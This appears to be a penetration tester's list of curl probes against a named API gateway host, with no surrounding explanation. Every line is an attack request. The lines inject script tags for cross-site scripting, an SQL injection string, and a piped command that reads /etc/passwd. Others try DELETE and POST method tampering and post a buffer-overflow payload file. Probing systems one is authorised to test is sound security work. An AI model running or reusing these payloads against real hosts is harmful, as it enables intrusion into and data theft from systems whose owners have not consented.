curl -k -H "Content-Type: application/json" https://edgegw2-api.foobz.com.au/ip"<script>alert(1)</script>"
curl -k -H "Content-Type: application/json" https://edgegw2-api.foobz.com.au/header"<script>alert(1)</script>"
curl -k -H "Content-Type: application/json" https://edgegw2-api.foobz.com.au/api/user-agent"<script>alert(1)</script>"
curl -k -H "Content-Type: application/json" https://edgegw2-api.foobz.com.au/api/user-agent?"' OR 1=1#"
curl -k -H "Content-Type: application/json" https://edgegw2-api.foobz.com.au/api/user-agent?"page=test|/bin/cat%20/etc/passwd"
curl -k -H "Content-Type: application/json" https://edgegw2-api.foobz.com.au/api/header?"page=test|/bin/cat%20/etc/passwd"
curl -k -H "Content-Type: application/json" https://edgegw2-api.foobz.com.au/api/header
curl -k -H "Content-Type: application/json" https://edgegw2-api.foobz.com.au/ip -X DELETE
curl -k -H "Content-Type: application/json" https://edgegw2-api.foobz.com.au/ip -X POST

curl -k -H "Content-Type: application/json" https://edgegw2-api.foobz.com.au/response-headers -X POST -d @bufferoverflow.txt
